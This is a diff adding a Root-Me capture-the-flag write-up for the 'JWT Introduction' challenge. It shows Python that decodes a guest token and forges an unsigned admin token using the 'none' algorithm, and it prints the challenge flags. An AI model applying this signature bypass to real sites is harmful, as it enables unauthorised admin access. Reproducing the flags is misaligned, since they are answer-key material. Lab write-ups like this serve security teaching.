@@ -1,4 +1,4 @@
-# [Root-Me](./rootme.md) Root-Me Web Server [18/74]
+# [Root-Me](./rootme.md) Root-Me Web Server [19/74]
 
 Discover the mechanisms, protocols and technologies used on the Internet and learn to abuse them!
 
@@ -24,7 +24,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 16. [File upload - MIME type](#file-upload-mime-type) 🗸
 17. [HTTP - Cookies](#http-cookies) 🗸
 18. [Insecure Code Management](#insecure-code-management) 🗸
-19. [JSON Web Token (JWT) - Introduction](#json-web-token-jwt-introduction)
+19. [JSON Web Token (JWT) - Introduction](#json-web-token-jwt-introduction) 🗸
 20. [Directory traversal](#directory-traversal)
 21. [File upload - Null byte](#file-upload-null-byte)
 22. [JSON Web Token (JWT) - Weak secret](#json-web-token-jwt-weak-secret)
@@ -1854,6 +1854,144 @@ This is the sha256 hash of the password.  Using an [online unhasing tool]() we c
 
 ~~~
 s3cureP@ssw0rd
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## JSON Web Token JWT Introduction
+
+- Author: Kn0wledge
+- Date: 21 August 2019
+- Points: 20
+- Level: 2
+
+### Statement
+
+To validate the challenge, connect as admin.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch58/).
+
+### Resources
+
+1. [https://jwt.io/](https://jwt.io/).
+2. [RFC 7519](https://repository.root-me.org/RFC/EN%20-%20rfc7519.txt).
+3. [Attacking JWT Authentication](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Attacking%20JWT%20authentication%20-%20Sjoerd%20Langkemper.pdf).
+4. [Hacking JSON Web Token](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Hacking%20JSON%20Web%20Token%20(JWT)%20-%20Rudra%20Pratap.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+We can visit the website and view the source code:
+
+~~~html
+<html>
+  <body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+
+    <div class="panel">
+      <form method="post" action="index.php">
+        <h1>Login Form</h1>
+        <input type="text" name="username" placeholder=" Username" class="input" />
+        <input type="password" name="password" placeholder=" Password"  class="input" />
+        <button type="submit" class="btn">Sign In</button>
+      </form>
+      <p>You don't have an account? <a href="index.php?guest" style="color:#f1c40f;">Login as Guest!</a></p>
+    </div>
+  </body>
+</html>
+~~~
+
+We can see a form with username and password.  There is a link to the index.php authenticated using "guest".  Visiting this site we find cookie:
+
+~~~shell
+jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk
+~~~
+
+We can use an [online JWT decoder](https://www.jstoolset.com/jwt) to view the contents of the cookie or decompile in Python:
+
+~~~py
+import jwt
+
+encoded_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk"
+decoded_jwt = jwt.decode(encoded_jwt, options={"verify_signature": False})
+
+print(decoded_jwt)
+~~~
+
+returns:
+
+~~~
+{'username': 'guest'}
+~~~
+
+This shows us the cookie contains the field "username" set to guest.  Let's change this to admin, we can first deconstruct the jwt cookie:
+
+~~~py
+import base64 as b64
+base64_jwt = encoded_jwt.split(".")
+bytes_jwt_1 = b64.b64decode(base64_jwt[0])
+bytes_jwt_2 = b64.b64decode(base64_jwt[1]+"=")
+hex_jwt_1 = bytes_jwt_1.hex()
+hex_jwt_2 = bytes_jwt_2.hex()
+bytes_jwt_3 = b64.urlsafe_b64decode(base64_jwt[2]+"==")
+hex_jwt_3 = bytes_jwt_3.hex()
+
+print(bytes_jwt_1.decode())
+print(bytes_jwt_2.decode())
+~~~
+
+returns:
+
+~~~
+{"typ":"JWT","alg":"HS256"}
+{"username":"guest"}
+~~~
+
+This shows the encryption algorithm is HS256.  We can generate a new jwt removing the signature and changing the username:
+
+~~~py
+new_jwt_1 = '{"typ":"JWT","alg":"none"}'.encode()
+new_jwt_2 = '{"username":"admin"}'.encode()
+hex_new_jwt_1 = binascii.hexlify(new_jwt_1)
+b64_new_jwt_1 = b64.b64encode(new_jwt_1).decode()
+hex_new_jwt_2 = binascii.hexlify(new_jwt_2)
+b64_new_jwt_2 = b64.b64encode(new_jwt_2).decode()
+
+new_jwt = (b64_new_jwt_1+"." + b64_new_jwt_2+".")
+~~~
+
+This gives us a replacement JWT cookie:
+
+~~~
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIn0=.
+~~~
+
+Entering this into the cookie on the guest page takes us to the admin page and gives us the answer!
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7 
 ~~~
 
 </details>
